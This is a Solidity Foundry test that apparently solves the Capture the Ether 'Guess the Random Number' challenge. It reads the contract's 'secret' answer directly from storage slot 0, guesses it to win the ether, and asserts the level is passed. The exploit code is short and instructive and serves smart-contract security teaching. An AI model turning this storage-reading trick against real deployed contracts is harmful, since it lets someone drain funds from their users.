// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/lotteries/GuessTheRandomNumber.sol";
import "forge-std/console.sol";

// forge test --match-contract GuessTheRandomNumberTest -vvvv
contract GuessTheRandomNumberTest is Test {
    address player = address(100);

    function setUp() public {
        vm.deal(player, 5 ether);
    }

    function testGuessTheRandomNumberHack() public {
        /****************
         * Factory setup *
         *************** */
        GuessTheRandomNumberChallenge guessTheRandomNumber = new GuessTheRandomNumberChallenge{
                value: 1 ether
            }();
        vm.startPrank(player);
        uint256 initialPlayerBalance = player.balance;
        assertEq(initialPlayerBalance, 5 ether);
        /****************
         *    Attack     *
         *************** */
        /*
         * In this level  we have to guess a "random" number. Which is not random actually,
         * it's set up in the constructor and they assigned to uint8 answer.
         * This is SLOT0 of our contract storage. Thanks to foundry, we can access easily the
         * storage with vm.load(address, slot) and convert it to a uint8.
         */
        // uint8 answer = guessTheRandomNumber.answer();
        uint8 answer = uint8(
            uint256(vm.load(address(guessTheRandomNumber), 0))
        );

        guessTheRandomNumber.guess{value: 1 ether}(answer);
        uint256 finalPlayerBalance = player.balance;
        assertEq(finalPlayerBalance, 6 ether);
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = guessTheRandomNumber.isComplete();
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
